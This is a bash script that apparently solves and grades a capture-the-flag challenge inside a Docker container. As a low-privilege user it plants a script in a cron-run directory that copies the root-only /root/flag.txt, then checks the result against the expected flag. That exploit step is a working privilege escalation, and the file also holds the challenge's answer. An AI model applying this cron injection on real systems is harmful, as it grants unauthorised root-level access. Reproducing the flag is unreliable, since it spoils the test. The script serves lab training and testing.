#!/usr/bin/env bash
set -euo pipefail
IMG="ctf_ch9_cron"
cname="c9_run_$$"
docker run -d --rm --name "$cname" "$IMG" >/dev/null
docker exec -u ctfuser "$cname" bash -lc 'echo -e "#!/usr/bin/env bash\ncat /root/flag.txt > /tmp/out" > /var/cleanup/x.sh && chmod +x /var/cleanup/x.sh'
sleep 70
out="$(docker exec -u ctfuser "$cname" bash -lc 'cat /tmp/out')"
echo "Solver output: $out"
expected="flag{cron_injection}"
docker stop "$cname" >/dev/null
[[ "$out" == "$expected" ]] && echo "Challenge 9: PASS" || (echo "Challenge 9: FAIL (expected $expected)" >&2; exit 1)
